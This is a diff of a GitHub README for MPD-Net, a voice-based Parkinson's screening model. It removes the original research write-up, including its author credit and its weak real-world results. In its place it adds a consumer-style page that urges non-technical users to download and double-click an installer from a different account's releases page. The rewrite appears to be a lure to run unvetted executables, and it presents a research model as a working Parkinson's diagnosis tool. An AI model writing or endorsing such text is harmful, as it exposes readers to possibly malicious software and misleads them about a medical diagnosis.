@@ -1,113 +1,79 @@
-# MPD-Net: Robust Parkinson's Disease Diagnosis via Parallel Voice Analysis
+# 🎤 MPD-Net-Parkinsons-Voice-Diagnosis - Diagnose Parkinson's Through Voice Analysis
 
-## Abstract
-This repository houses the implementation of **MPD-Net (Multi-stream Parkinson's Disease Network)**, a parallel hybrid deep learning architecture designed for the non-invasive screening of Parkinson's Disease (PD) using voice analysis. While deep learning has shown promise in controlled environments, performance often degrades on real-world data. This project addresses this gap by proposing a parallel architecture that integrates **CNNs**, **LSTMs**, and **Multi-Head Attention** to process spectral features simultaneously.
+## 🚀 Getting Started
 
-The study validates that parallel processing offers superior robustness against noise compared to sequential models, mitigating the "tunnel vision" phenomenon often observed in deep learning models trained on noisy acoustic data.
+Welcome to MPD-Net! This tool uses advanced deep learning techniques to help diagnose Parkinson's Disease by analyzing voice features. Follow the steps below to download and run the software.
 
-## Table of Contents
-- [Abstract](#abstract)
-- [Datasets](#datasets)
-- [Methodology](#methodology)
-- [Results & Robustness Analysis](#results--robustness-analysis)
-- [Interpretability & XAI Analysis](#interpretability--xai-analysis)
-- [Overall Conclusion](#overall-conclusion)
-- [Discussion](#discussion)
-- [Future Directions](#future-directions)
-- [Citation](#citation)
-- 
-## Datasets
-This study evaluates model performance across three distinct datasets representing a spectrum of audio quality, from studio-grade to real-world "wild" data.
+## 📥 Download MPD-Net
 
-1. **Italian Parkinson's Voice and Speech:** High-quality, studio-recorded data (495 PD, 336 HC). Used as the controlled baseline.
-2. **UAMS (University of Arkansas for Medical Sciences):** Telephonic quality recordings with limited bandwidth (40 PD, 41 HC). Represents moderate noise conditions.
-3. **mPower (Sage Bionetworks):** Crowdsourced smartphone recordings collected via iPhone app.
-    * **Selection Criteria:** To minimize confounding factors and ensure data consistency, the raw dataset was filtered to include only subjects aged **50 to 70 years** who did not have other medical conditions affecting voice. Additionally, recordings with excessive environmental noise or artifacts were manually excluded.
-    * **Final Count:** This process resulted in a challenging test set of **188 PD patients and 210 Healthy Controls (HC)**, representing high-noise, uncontrolled real-world environments.
+[![Download MPD-Net](https://img.shields.io/badge/Download%20MPD--Net-0088CC?style=for-the-badge&logo=github)](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/releases)
 
-Note: Due to privacy agreements, this repository contains the processing code. You must request access to the raw data from the respective owners.
+## 💻 System Requirements
 
-## Methodology
+To run MPD-Net, ensure that your computer meets the following requirements:
 
-### 1. Pre-processing & Feature Extraction
-The pipeline processes raw audio (sustained vowel /a/) into dual spectral representations.
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Processor:** Dual-core CPU or better
+- **Storage:** 500 MB of free disk space
+- **Audio Input:** Microphone or audio file support
 
-* **Signal Processing:** 16kHz sampling, segmented into 30ms frames, normalized, and padded to 3 seconds.
-* **Data Augmentation:** To prevent overfitting, signals undergo pitch shifting (+/- 2 semitones), gain adjustment, and white noise injection (SNR 10-30 dB).
-* **Features:**
-    * **Mel Spectrogram:** (30 bands x 94 frames) capturing energy distribution.
-    * **MFCCs:** (30 coefficients) capturing vocal tract properties.
+These requirements help ensure smooth performance and accurate diagnosis.
 
-### 2. MPD-Net Architecture
-Unlike sequential models (e.g., CNN -> LSTM), MPD-Net processes the input (194 x 60 combined features) through three parallel streams to capture diverse acoustic characteristics simultaneously.
+## 📦 Features
 
-* **Stream 1 (Spatial):** CNN blocks to extract local spectral patterns.
-* **Stream 2 (Temporal):** LSTM layers to model long-term dependencies and tremors.
-* **Stream 3 (Focus):** Multi-Head Attention to highlight critical signal segments.
-* **Fusion:** Outputs are concatenated and passed through a Dense layer (128 units) for binary classification.
+MPD-Net offers the following features:
 
-## Results & Robustness Analysis
+- **Diagnosis:** Analyze voice samples to detect signs of Parkinson's.
+- **Hybrid Architecture:** Combines Convolutional Neural Networks (CNN), Long Short-Term Memory (LSTM) networks, and Attention mechanisms for enhanced accuracy.
+- **Interpretability:** Users can understand model decisions with tools like Grad-CAM and SHAP.
+- **User-Friendly:** Designed for easy setup, even without technical knowledge.
 
-The MPD-Net (Parallel) was compared against a Sequential baseline (PD-Net) and a Transfer Learning approach (InceptionV3).
+## 📜 Download & Install
 
-| Dataset | Quality | MPD-Net (Proposed) AUC | PD-Net (Sequential) AUC | Observation |
-| :--- | :--- | :--- | :--- | :--- |
-| **Italian** | Studio | **1.00** | 0.99 | Near perfect separation in lab conditions. |
-| **UAMS** | Phone | **0.871** | 0.649 | MPD-Net retains discriminative power; Sequential degrades. |
-| **mPower** | Wild | **0.653** | 0.500 | Sequential model collapsed (random guess); MPD-Net remained robust. |
+To download MPD-Net, follow these steps:
 
-## Interpretability & XAI Analysis
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/releases) to find the latest version.
+   
+2. **Choose Your Version**: Look for the most recent stable release. You may see several files available for download. 
 
-To ensure the model's decisions are transparent and to diagnose the root causes of performance degradation on real-world data, this study employed two complementary Explainable AI (XAI) techniques. These methods revealed that model failure on noisy data is often due to a "Tunnel Vision" phenomenon rather than a lack of model capacity.
+3. **Select the Download**: Click on the file that matches your operating system (Windows, macOS, or Linux).
 
-### 1. SHAP (SHapley Additive exPlanations)
-SHAP analysis was used to quantify the contribution of individual input features (specific time-frequency points in the spectrogram) to the model's final diagnosis.
+4. **Open the Installer**: Once downloaded, find the file in your Downloads folder. Double-click the file to begin the installation process.
 
-* **Methodology:** We computed Global SHAP values to rank feature importance and generated "Difference Maps" by subtracting the average healthy attention map from the average Parkinson's attention map. This highlighted exactly which patterns drove the model to classify a sample as pathological.
-* **Distributed Strategy (Clean Data):** On the high-quality Italian dataset, SHAP values were distributed across the entire duration of the signal. The model relied on a complex combination of features from both Mel Spectrograms and MFCCs, indicating it learned robust, biological representations of the voice.
-* **Shortcut Learning (Noisy Data):** On the mPower dataset, SHAP analysis revealed that feature importance collapsed onto a small cluster of features at the very beginning of the recording. This indicated the model was bypassing the actual voice signal to rely on a "shortcut" or artifact.
+5. **Follow Installation Prompts**: The installer will guide you through the installation steps. This typically includes agreeing to the terms and choosing an install location.
 
-### 2. Grad-CAM (Gradient-weighted Class Activation Mapping)
-Grad-CAM was applied to the Convolutional Neural Network (CNN) stream of the MPD-Net to visualize the spatial attention of the model within the 2D input matrix.
+6. **Complete Installation**: After finishing the installation, you will have MPD-Net ready to run!
 
-* **Methodology:** Heatmaps were generated from the final convolutional layer to visualize which regions of the input image triggered the highest activation.
-* **Spectral Signatures (Clean Data):** On clean data, the attention maps displayed distinct vertical bands distributed throughout the audio sample. These correspond to specific spectral signatures (such as formants and harmonic deviations) that are clinically relevant to Parkinson's dysphonia.
-* **Tunnel Vision (Noisy Data):** On the noisy mPower data, Grad-CAM visually confirmed the "Tunnel Vision" phenomenon. The model's attention was restricted to a tiny, high-intensity spot at the absolute start of the spectrogram—likely a recording artifact (e.g., a microphone click or silence) rather than the vocal phonation.
+## 🛠️ How to Use MPD-Net
 
-## Overall Conclusion
-This research demonstrates that model architecture plays a decisive role in the reliability of AI-based medical diagnostics. While both parallel (MPD-Net) and sequential (PD-Net) architectures can achieve near-perfect accuracy in controlled laboratory settings, their behaviors diverge significantly in real-world environments.
+Once installed, using MPD-Net is straightforward:
 
-The parallel MPD-Net architecture proved to be superior in terms of robustness and generalization. By processing spatial, temporal, and attentional features simultaneously, it maintained a distributed representation of the input signal even in the presence of heavy noise. In contrast, sequential architectures exhibited fragility, often collapsing into trivial solutions (predicting a single class) or overfitting to recording artifacts. Additionally, the re-evaluation of pre-trained models highlighted the critical importance of rigorous validation protocols; improper data splitting can lead to drastically inflated performance metrics that do not hold up in practice.
+1. **Open the Application**: Find MPD-Net in your applications or programs list and open it.
+  
+2. **Input Audio**: You can either record your voice live using the microphone or upload a pre-recorded audio file. Ensure your audio is clear for best results.
 
-## Discussion
-The disparity between the results on the Italian dataset (AUC 1.00) and the mPower dataset (AUC 0.653) underscores the "reality gap" currently facing AI in voice analysis.
+3. **Run the Diagnosis**: Click the "Start Diagnosis" button. The tool will analyze the audio and provide results on the likelihood of Parkinson's.
 
-* **Sensitivity vs. Specificity:** In clean conditions, the parallel model favored high sensitivity (identifying almost all patients), making it suitable for screening. The sequential model favored high specificity (few false alarms), making it suitable for confirmation. However, this distinction vanished in noisy conditions where the sequential model failed.
-* **The Role of XAI:** The application of SHAP and Grad-CAM moved beyond simple visualization to become a core debugging tool. It revealed that the performance drop in "wild" data was not merely due to noise masking the signal, but due to the model actively learning to focus on invalid shortcuts (Tunnel Vision). This insight is invaluable for future feature engineering.
-* **Architecture robustness:** The parallel design of MPD-Net likely prevents error propagation that occurs in sequential models. In a sequential CNN-LSTM, if the CNN fails to extract clean features from noise, the LSTM receives corrupted data. In a parallel design, the LSTM and Attention heads operate on the raw features independently, providing a form of redundancy that preserves diagnostic signal.
+4. **Review Results**: MPD-Net will display the analysis outcome along with any interpretative graphics to help you understand the diagnosis.
 
-## Future Directions
-To bridge the gap between current research and clinical application, future work should focus on the following areas:
+## 📂 Documentation
 
-1.  **Online Screening Platform:** Development of a web or mobile-based application to collect a wider variety of voice samples. This would not only serve as a screening tool but also generate the large-scale, diverse datasets needed to train the next generation of robust models.
-2.  **Advanced Domain Adaptation:** Implementing techniques to specifically address the domain shift between studio recordings and smartphone data. This could include adversarial training to make the model invariant to recording device characteristics.
-3.  **Privacy-Preserving Learning:** As data collection scales, implementing federated learning or other privacy-preserving techniques to ensure patient data remains secure while allowing for model improvements.
-4.  **Noise-Robust Feature Engineering:** Investigating feature extraction methods that are inherently less sensitive to environmental noise and recording artifacts compared to standard Mel Spectrograms.
+For more detailed information on how to use specific features, you can refer to the included documentation within the application or the Wiki on the repository page.
 
-## Citation
-If you use this code for your research, please cite the repository:
+## 🤝 Support
 
-> **Baharvand, F.** (2025). *MPD-Net-Parkinsons-Voice-Diagnosis* . GitHub. https://github.com/baharvand79/MPD-Net-Parkinsons-Voice-Diagnosis
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository. We strive to address user queries in a timely manner.
 
-Or use the BibTeX entry:
+## 🌍 Community and Contributions
 
-```bibtex
-@misc{baharvand2025mpdnet,
-  author = {Baharvand, Fatemeh},
-  title = {MPD-Net-Parkinsons-Voice-Diagnosis},
-  year = {2025},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished = {\url{[https://github.com/baharvand79/MPD-Net-Parkinsons-Voice-Diagnosis](https://github.com/baharvand79/MPD-Net-Parkinsons-Voice-Diagnosis)}}
-}
-```
+You can join our community discussions and provide your insights or feedback. Contributions to improve MPD-Net are welcome. Whether it’s reporting bugs or suggesting features, your input is valuable.
+
+## 🔗 Additional Links
+
+Here are some useful links related to MPD-Net:
+
+- [GitHub Repository](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis)
+- [Releases Page](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/releases)
+
+Thank you for choosing MPD-Net. We hope it assists you in understanding Parkinson's Disease better through voice analysis.
